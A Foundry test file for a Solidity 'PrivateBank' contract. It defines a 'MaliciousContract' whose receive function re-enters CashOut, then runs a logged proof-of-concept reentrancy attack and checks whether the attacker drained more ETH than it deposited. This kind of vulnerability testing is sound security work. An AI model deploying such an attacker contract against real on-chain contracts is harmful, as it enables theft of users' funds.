// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e.sol";

// Create a mock Log contract that doesn't inherit from the original Log
contract MockLog {
    function AddMessage(address _adr, uint256 _val, string memory _data) public pure {}
}

contract MaliciousContract {
    PrivateBank privateBank;
    uint256 public attackCount;
    uint256 public attackAmount;

    constructor(address payable _privateBankAddress) {
        privateBank = PrivateBank(_privateBankAddress);
    }

    // Receive function that will be triggered when receiving ETH
    receive() external payable {
        if (attackCount < 1 && address(privateBank).balance >= attackAmount) {
            attackCount++;
            privateBank.CashOut(attackAmount);
        }
    }

    function deposit() external payable {
        privateBank.Deposit{value: msg.value}();
    }

    function attack(uint256 _amount) external {
        attackAmount = _amount;
        privateBank.CashOut(_amount);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract PrivateBankTest is Test {
    PrivateBank privateBank;
    MaliciousContract attacker;
    MockLog mockLog;
    address victim = address(0x1);
    uint256 initialDeposit = 1 ether;

    function setUp() public {
        // Deploy mock Log contract first
        mockLog = new MockLog();
        
        // Then deploy PrivateBank with the mock Log address
        privateBank = new PrivateBank(address(mockLog));
        
        // Deploy attacker contract
        attacker = new MaliciousContract(payable(address(privateBank)));

        // Victim deposits funds
        vm.deal(victim, initialDeposit);
        vm.prank(victim);
        privateBank.Deposit{value: initialDeposit}();

        // Attacker deposits funds
        vm.deal(address(attacker), initialDeposit);
        vm.prank(address(attacker));
        attacker.deposit{value: initialDeposit}();
    }

    function testReentrancyAttack() public {
        console.log("--- BEFORE-Trigger Attack ---");
        uint256 attackerInitialBalance = address(attacker).balance;
        uint256 bankInitialBalance = address(privateBank).balance;
        console.log("Initial Bank ETH Balance:", bankInitialBalance);
        console.log("Initial Attacker ETH Balance:", attackerInitialBalance);

        console.log("--- Trigger Attack ---");
        // Perform attack
        vm.prank(address(attacker));
        attacker.attack(initialDeposit);

        console.log("--- AFTER-Trigger Attack ---");
        uint256 attackerFinalBalance = address(attacker).balance;
        uint256 bankFinalBalance = address(privateBank).balance;
        console.log("Final Bank ETH Balance:", bankFinalBalance);
        console.log("Final Attacker ETH Balance:", attackerFinalBalance);

        uint256 bankLoss = bankInitialBalance - bankFinalBalance;
        uint256 attackerProfit = attackerFinalBalance - attackerInitialBalance;
        console.log("Bank Loss:", bankLoss);
        console.log("Attacker Profit:", attackerProfit);

        // Vulnerability exists if attacker gained more than deposited amount
        // (normally should only withdraw initialDeposit)
        bool vulnerabilityExists = attackerProfit > initialDeposit;
        
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Attacker gained extra ETH through reentrancy");
        } else {
            console.log("Vulnerability not Exist: No abnormal ETH gain detected");
        }
    }
}